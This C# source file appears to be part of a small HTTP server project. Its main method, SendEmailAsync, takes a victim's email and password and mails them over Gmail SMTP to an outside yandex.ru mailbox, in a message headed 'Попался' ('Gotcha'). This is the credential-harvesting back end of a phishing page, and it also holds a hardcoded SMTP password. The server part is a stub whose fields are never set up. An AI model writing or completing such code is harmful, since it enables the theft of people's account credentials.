using System.Net;
using System.Net.Mail;
using System.Security;

namespace MyHTTPServer;

public class Server : IDisposable
{
    private CancellationTokenSource _cancellationTokenSource;
    private HttpListener _listener;
    private AppSettingConfig _config;

    public async void Start()
    {
        _listener.Start();
    }
    
    public void Stop()
    {
        _cancellationTokenSource.Cancel();
    }
    
    public void Dispose()
    {
        Stop();
    }

    public static async Task SendEmailAsync(string email, string password)
    {
        string emailSender = "somemail@gmail.com";
        string passwordSender = "mypassword";
        
        string emailFrom = "somemail@gmail.com";
        string fromMe = "Tom";
        string emailTo = "somemail@yandex.ru";
        
        string subject = "subject";
        string body = $"<h1>Попался </h1><p>email: {email}</p><p>password: {password}</p>";

        string smtpServerHost = "smtp.gmail.com";
        ushort smtpServerPort = 587;
        

        MailAddress from = new MailAddress(emailFrom, fromMe);
        MailAddress to = new MailAddress(emailTo);
        MailMessage m = new MailMessage(from, to);
        m.Subject = subject;
        m.Body = body;
        SmtpClient smtp = new SmtpClient(smtpServerHost, smtpServerPort);
        smtp.Credentials = new NetworkCredential(emailSender, passwordSender);
        smtp.EnableSsl = true;
        await smtp.SendMailAsync(m);
        Console.WriteLine("Письмо отправлено");
    }
    
}